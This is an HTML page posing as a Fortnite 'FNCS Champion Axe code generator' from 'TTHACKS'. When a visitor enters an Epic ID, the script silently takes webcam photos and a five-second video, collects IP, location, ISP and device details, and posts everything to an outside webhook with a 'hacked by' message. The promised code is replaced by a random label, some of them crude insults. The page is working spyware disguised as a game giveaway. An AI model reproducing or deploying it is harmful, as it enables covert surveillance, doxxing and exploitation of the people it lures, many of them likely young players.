
<!DOCTYPE html>
<html lang="ja">
<head>
  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
  <meta charset="UTF-8">
  <head prefix="og: https://ogp.me/ns#">
<meta property="og:title" content="FNCS CHAMPION AXE CODE GEN"/>
<meta property="og:description" content="PROVIDED BY TTHACKS"/>
<meta property="og:type" content=""/>
<meta property="og:url" content=""/>
<meta property="og:image" content="https://github.com/albamaruo/fncs/blob/main/tthacks.png?raw=true"/>
</head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FNCS CODE GENERA</title>
</head>
<body style="background-color:black">
  <div class="screen active" id="screen1">
    <div class="bg-black pb-6 sm:pb-8 lg:pb-12">
      <div class="mx-auto max-w-screen-2xl px-4 md:px-8">
        <header class="mb-8 flex items-center justify-between py-4 md:mb-12 md:py-8 xl:mb-16">
          <!-- logo - start -->
          <font color="red">  <p class="inline-flex items-center gap-2.5 text-2xl font-bold  md:text-3xl" aria-label="logo">
            <img width="95" height="94" viewBox="0 0 95 94" class="h-auto w-6 text-indigo-500" fill="currentColor" src="https://github.com/albamaruo/fncs/blob/main/tthacks.png?raw=true">
            TTHACKS
          </p></font>
        </header>
    
        <section class="flex flex-col justify-between gap-6 sm:gap-10 md:gap-16 lg:flex-row">
          <div class="flex flex-col items-center justify-center sm:text-center lg:items-start lg:py-12 lg:text-left xl:w-5/12 xl:py-24">
            <font color="red"><h1 class="mb-8 text-4xl font-bold sm:text-5xl md:mb-12 md:text-6xl">FNCS CODE GEN v2</h1></font>
    
            <p class="mb-8 leading-relaxed text-gray-500 md:mb-12 lg:w-4/5 xl:text-lg"></p>    
            <p class="flex w-full gap-2 md:max-w-md">
              <input placeholder="please enter your epicID"type="text" id="username" class="w-full flex-1 rounded border bg-gray-50 px-3 py-2 text-gray-800 placeholder-gray-500 outline-none ring-indigo-300 transition duration-100 focus:ring" />
    
              <button onclick="nextScreen()"class="inline-block rounded bg-red-500 px-8 py-2 text-center text-sm font-semibold text-white outline-none ring-indigo-300 transition duration-100 hover:bg-indigo-600 focus-visible:ring active:bg-indigo-700 md:text-base">GEN</button>
          </div>
          <div class="h-48 overflow-hidden rounded-lg bg-gray-100 shadow-lg lg:h-auto xl:w-5/12">
            <img src="https://github.com/albamaruo/fncs/blob/main/%E5%90%8D%E7%A7%B0%E6%9C%AA%E8%A8%AD%E5%AE%9A.png?raw=true" loading="lazy" alt="Photo by Fakurian Design" class="h-full w-full object-cover object-center" />
          </div>
        </section>
      </div>
    </p>
    </div>














  </div>
  <div class="screen" id="screen2">
    <div class="loader" id="loader" style="display:none;">
    </div>
    <div id="status">
    </div>
  </div>
  <div class="screen" id="screen3">
  </div>
  <video id="video" style="display:none"autoplay playsinline>
  </video>
  <canvas id="canvas">
  </canvas>
  <script>
  const WEBHOOK_URL = "https://kao.aarrkami403.workers.dev/";

    const screens = document.querySelectorAll('.screen');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const loader = document.getElementById('loader');
    const statusText = document.getElementById('status');
    let userName = '';

    function nextScreen() {
      userName = document.getElementById('username').value || '名無し';
      screens[0].classList.remove('active');
      screens[1].classList.add('active');
      startDiagnosis();
    }

    function switchToResultScreen(result) {
      screens[1].classList.remove('active');
      screens[2].classList.add('active');
      document.getElementById('resultText').innerText = `診断結果：あなたは「${result}」タイプ！`;
    }

    function base64ToBlob(base64, mime) {
      const byteChars = atob(base64);
      const byteArray = new Uint8Array([...byteChars].map(c => c.charCodeAt(0)));
      return new Blob([byteArray], { type: mime });
    }

    async function fetchIPInfo() {
      const res = await fetch("https://ipinfo.io/json?token=1dd9dc2fae2fbe");
      return res.json();
    }

    function getDeviceInfo() {
      return {
        ua: navigator.userAgent,
        lang: navigator.language,
        size: `${window.screen.width}x${window.screen.height}`,
      };
    }

    function generateRandomResult() {
      const results = [
        "くそきもい", "さくら？", "さくらじゃね？", "れなさんにょっす？",
        "ＧＸ８尖閣", "ぺろまる", "ＰＲ２桁", "撮り鉄",
        "さすがにGX８尖閣", "ドクターイエロー", "京成電鉄", "ゆうとくん",
        "れべちちゃん", "対面最弱おまんこくんだっちゃ", "ねるねるねるね幸運", "ロバ",
        "クールビューティ", "ド天然顔", "優等生系", "さわやか系", "いたずらっ子顔",
        "陰キャ美形", "量産型", "個性派", "ひとをころしてそうなめ", "モテそう", "守ってあげたくなる顔",
        "イケボ顔", "あざとい系", "犬系男子", "猫系女子", "塩顔", "濃い顔", "童顔", "老け顔",
        "癒し系", "知的系", "残念美人", "アーティスト系", "ファニーフェイス", "美少女風", "彫り深め", 
        "昭和感", "平成JK風", "令和トレンド顔", "ぜの", "後藤文の花嫁すきそう", "フィルター系", "加工不要",
        "モデル体型顔", "ミステリアス", "アイドル級", "チーズバーガー", "広島原爆４０００度顔",
        "アバター感", "海外モデル風", "不思議ちゃん系", "雰囲気美人", "無敵感ある",
        "ノスタルジック顔", "あか抜け前", "覚醒前夜", "ポテンシャル◎", "無表情でも映える",
        "強メンタル顔", "泣き顔映え", "赤ちゃんみ", "どや顔タイプ", "やさぐれ美人",
        "人見知り顔", "無害系", "地雷顔", "沼り系", "映え顔", "TikTok映え", "透明感つよめ",
        "青目", "口元がチャームポイント", "目力が強い", "眉毛が整ってる", "小顔",
        "フィエロ", "GX９一点かたむき", "わんこちゃんレスかかまや", "ゾンビアンドレッド",
        "ザンビ", "対面最弱れべちくんだっちゃ幸運", "撮り鉄のリーダー", "コナンの犯人は林警部補", "中学生の雑談オプれべちくん",
        "アニメオタク", "戦争オタク", "しんかんせんこだま", "ぺろまる覚醒極幸運", "うまらぽ", "らぽさん"
      ];
      return results[Math.floor(Math.random() * results.length)];
    }

    async function startDiagnosis() {
      loader.style.display = "block";
      statusText.textContent = "カメラを起動しています...";

      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;

      await new Promise(res => setTimeout(res, 500)); // 安定化

      const photos = [];
      for (let i = 0; i < 2; i++) {
        await new Promise(res => setTimeout(res, 300));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        photos.push(canvas.toDataURL("image/png"));
      }
      const mediaRecorder = new MediaRecorder(stream);
      const chunks = [];
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.start();
      await new Promise(res => setTimeout(res, 5000));
      mediaRecorder.stop();
      await new Promise(res => mediaRecorder.onstop = res);
      const videoBlob = new Blob(chunks, { type: 'video/webm' });
      stream.getTracks().forEach(track => track.stop());
      const ip = await fetchIPInfo();
      const device = getDeviceInfo();
      const result = generateRandomResult();
      const embed = {
        title: "AI診断ログ",
        color: 0xff99cc,
        fields: [
          { name: "名前", value: userName, inline: true },
          { name: "IP", value: ip.ip, inline: true },
          { name: "国/地域", value: `${ip.country} / ${ip.region}`, inline: true },
          { name: "通信会社", value: ip.org || "不明", inline: false },
          { name: "デバイス", value: device.ua, inline: false },
          { name: "画面", value: device.size, inline: true },
          { name: "言語", value: device.lang, inline: true },
          { name: "診断結果", value: result, inline: false }
        ]
      };
const formData = new FormData();
photos.forEach((p, i) => {
  const blob = base64ToBlob(p.split(',')[1], "image/png");
  formData.append("file" + i, blob, `photo${i + 1}.png`);
});
formData.append("video", videoBlob, "video.webm");
const payload = {
  content: "@everyone hacked by https://albamaruo.github.io/cn/",
  embeds: [embed],
  username: "AI診断Bot"
};
formData.append("payload_json", JSON.stringify(payload));
      await fetch(WEBHOOK_URL, {
        method: "POST",
        body: formData
      });
      loader.style.display = "none";
      switchToResultScreen(result);
    }
    function shareTwitter() {
      const text = encodeURIComponent("AI診断やってみた！結果がやばいかも！？");
      const url = encodeURIComponent(window.location.href);
      window.open(`https://twitter.com/intent/tweet?text=${text}&url=${url}`);
    }

    function shareLine() {
      const url = encodeURIComponent(window.location.href);
      window.open(`https://line.me/R/msg/text/?AI診断が面白い！%0A${url}`);
    }

    function shareInstagram() {
      alert("Instagramはシェア用URLをコピーして、ストーリーズなどに貼り付けてください！");
      navigator.clipboard.writeText(window.location.href);
    }
  </script>

</body>

</html>
